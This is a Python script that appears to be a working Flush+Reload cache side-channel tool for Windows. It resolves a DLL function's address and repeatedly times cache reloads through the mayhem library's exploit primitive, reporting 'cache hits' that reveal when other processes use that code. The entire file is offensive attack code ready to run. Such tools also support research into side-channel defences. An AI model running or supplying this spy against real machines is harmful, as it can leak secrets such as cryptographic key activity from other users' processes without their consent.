import argparse
import ast
import ctypes
import time

import mayhem.datatypes.windows as wintypes
import mayhem.exploit.windows

__version__ = '1.0'
k32 = ctypes.windll.kernel32
k32.LoadLibraryW.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPSTR]
k32.GetProcAddress.restype = ctypes.c_void_p

def symbol(symbol):
	if not '!' in symbol:
		raise TypeError('symbol must be in library!name format')
	library, name = symbol.split('!', 1)
	library_handle = k32.LoadLibraryW(library)
	if not library_handle:
		raise TypeError('failed to resolve: ' + symbol)
	address = k32.GetProcAddress(library_handle, name.encode('utf-8') + b'\x00')
	if not address:
		raise TypeError('failed to resolve: ' + symbol)
	return address

def spy(address, threshold, timeout=20):
	print("[*] target address: 0x{0:016x}".format(address))
	fr = mayhem.exploit.windows.WindowsX64FlushReload()

	expiration = time.time() + timeout
	while time.time() < expiration:
		value = fr(address)
		if value > threshold:
			continue
		print("cache hit: {0}".format(value))

def main():
	parser = argparse.ArgumentParser(description='Flush+Reload Spy', conflict_handler='resolve')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s Version: ' + __version__)
	parser.add_argument('-t', '--timeout', type=int, default=20, help='the time in seconds to monitor')
	parser.add_argument('address', metavar='symbol', type=symbol, help='the symbol to target')
	parser.add_argument('threshold', type=int, help='the threshold for cache hits')
	arguments = parser.parse_args()

	spy(arguments.address, arguments.threshold, timeout=arguments.timeout)

if __name__ == '__main__':
	main()
